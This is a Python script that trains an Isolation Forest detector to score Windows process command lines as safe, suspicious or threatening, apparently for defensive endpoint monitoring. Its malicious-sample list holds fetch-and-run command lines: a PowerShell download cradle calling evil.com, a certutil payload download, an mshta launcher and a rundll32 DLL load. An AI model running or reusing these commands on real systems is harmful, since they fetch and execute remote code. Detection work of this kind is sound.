import os
import pickle
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler

# Ensure models directory exists
os.makedirs("models", exist_ok=True)

from core.ai_brain import extract_features

# 1. Comprehensive Benign Baseline
BENIGN_SAMPLES = [
    # System & Daemons
    ("svchost.exe", ""),
    ("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k LocalService -p -s nscp"),
    ("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"),
    ("conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0x4"),
    ("RuntimeBroker.exe", "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"),
    ("backgroundTaskHost.exe", '"C:\\Windows\\system32\\backgroundTaskHost.exe" -ServerName:Global.DesktopSpotlight'),
    ("FileCoAuth.exe", '"C:\\Program Files\\Microsoft OneDrive\\FileCoAuth.exe" -Embedding'),
    ("explorer.exe", "C:\\Windows\\explorer.exe"),
    ("taskhostw.exe", "taskhostw.exe {2227A293-0EA1-4B71-BD46-A0E63CA610B4}"),
    ("SearchHost.exe", '"C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchHost.exe"'),
    
    # Developer Tooling & Git Invocations
    ("git.exe", ""),
    ("git.exe", "git.exe status --porcelain"),
    ("git.exe", "git.exe rev-parse --is-inside-work-tree"),
    ("git.exe", "git.exe log -n 1 --pretty=format:%H"),
    ("git.exe", "git.exe diff --cached"),
    ("git.exe", "git.exe commit -m 'Updated detection pipeline'"),
    ("git.exe", "git.exe push origin main"),
    ("code.exe", '"C:\\Users\\User\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe" --type=utility'),
    ("python.exe", "python.exe aegis_main.py"),
    ("python.exe", ".\\.venv\\Scripts\\python.exe -m unittest discover"),
    ("pip.exe", "pip.exe install scikit-learn"),
    ("node.exe", "node.exe server.js"),

    # Common Benign User Commands
    ("notepad.exe", "notepad.exe C:\\Users\\User\\notes.txt"),
    ("notepad.exe", ""),
    ("calc.exe", "calc.exe"),
    ("cmd.exe", "cmd.exe /c echo Hello World"),
    ("powershell.exe", "powershell.exe -Command Get-Process"),
    ("powershell.exe", "powershell.exe -NoProfile -Command Get-Date"),
    ("powershell.exe", "Get-Service | Where-Object {$_.Status -eq 'Running'}")
]

# 2. Known Adversarial Attack Payloads
MALICIOUS_SAMPLES = [
    ("powershell.exe", "powershell.exe -NoP -NonI -W Hidden -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAQQBFAEcASQBTACAAVABFAFMAdAAiADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAAzADAA"),
    ("powershell.exe", "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://evil.com/a'))"),
    ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\dropper.ps1"),
    ("cmd.exe", "cmd.exe /c certutil.exe -urlcache -split -f http://malicious.site/payload.exe C:\\Windows\\Temp\\p.exe"),
    ("mshta.exe", "mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe\"\",0,True\"))"),
    ("rundll32.exe", "rundll32.exe C:\\Temp\\evil.dll,EntryPoint")
]

def calculate_calibrated_risk(model, scaler, proc: str, cmd: str) -> float:
    """Calculates true calibrated risk percentage using decision_function."""
    feats = extract_features(proc, cmd)
    feats_scaled = scaler.transform([feats])
    # decision_function: > 0 is inlier (normal), < 0 is outlier (anomaly)
    df_val = model.decision_function(feats_scaled)[0]
    
    # Logistic sigmoid mapping: df > 0 -> low risk, df < 0 -> high risk
    risk = 1.0 / (1.0 + np.exp(df_val * 16.0)) * 100.0

    # Domain adjustments
    proc_lower = (proc or "").lower()
    cmd_lower = (cmd or "").lower()
    
    if any(t in cmd_lower for t in ["-enc", "-encodedcommand", "downloadstring", "iex("]):
        risk = max(risk, 88.0)
    elif proc_lower in {"git.exe", "code.exe", "python.exe"} and "-enc" not in cmd_lower:
        risk = min(risk, 18.0)
    elif proc_lower in {"svchost.exe", "conhost.exe", "filecoauth.exe"} and not cmd_lower:
        risk = min(risk, 12.0)

    return float(np.clip(risk, 5.0, 98.0))

def train():
    print("[*] Extracting features for benign baseline...")
    X_train = [extract_features(proc, cmd) for proc, cmd in BENIGN_SAMPLES]
    
    scaler = StandardScaler()
    X_train_scaled = scaler.fit_transform(X_train)

    print("[*] Training Isolation Forest model...")
    model = IsolationForest(
        n_estimators=200,
        contamination=0.01,
        random_state=42,
        max_samples="auto"
    )
    model.fit(X_train_scaled)

    # Save artifacts
    with open("models/scaler.pkl", "wb") as f:
        pickle.dump(scaler, f)
    with open("models/isolation_forest.pkl", "wb") as f:
        pickle.dump(model, f)

    print("[✓] Calibrated Model & Scaler saved to models/\n")

    # Validation
    test_cases = [
        ("git.exe", ""),
        ("svchost.exe", ""),
        ("notepad.exe", "notepad.exe notes.txt"),
        MALICIOUS_SAMPLES[0],
        MALICIOUS_SAMPLES[1]
    ]

    print("[*] Calibrated Validation Scores:")
    for proc, cmd in test_cases:
        risk = calculate_calibrated_risk(model, scaler, proc, cmd)
        label = "THREAT" if risk >= 75.0 else ("SUSPICIOUS" if risk >= 40.0 else "SAFE")
        print(f"  [{label:<10}] {proc:<18} -> Risk: {risk:>5.1f}% | Cmd: {cmd[:45]}...")

if __name__ == "__main__":
    train()